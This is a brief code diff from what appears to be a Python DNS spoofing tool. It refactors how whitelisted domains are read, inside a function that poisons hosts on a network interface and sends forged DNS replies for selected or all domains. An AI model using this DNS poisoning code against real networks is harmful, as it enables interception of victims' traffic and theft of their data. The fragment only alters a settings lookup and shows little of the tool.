@@ -16,7 +16,6 @@ def spoof(interface: str, settings: dict):
     print('DNS poisoning hosts on ' + interface + ' after requests are sent')
     hosts_dictionary: dict = settings['hosts'][interface]
     whitelist_hosts: dict = settings['whitelist poisoned hosts'][interface]
-    whitelist_domains: dict = settings['whitelist spoofed domains']
     attacker_mac = get_if_hwaddr(interface)
 
     # Start poisoning
@@ -55,7 +54,7 @@ def spoof(interface: str, settings: dict):
         dns = received_packet[DNS]
         if dns.opcode == 0 and dns.ancount == 0:
             target = received_packet[DNSQR].qname
-            if settings['spoof all domains'] and target.decode()[: -1] not in whitelist_domains:
+            if settings['spoof all domains'] and target.decode()[: -1] not in settings['whitelist spoofed domains']:
                 send_dns_poison(mac, ip, received_packet)
             elif target.decode()[: -1] in settings['spoofed domains']:
                 send_dns_poison(mac, ip, received_packet)
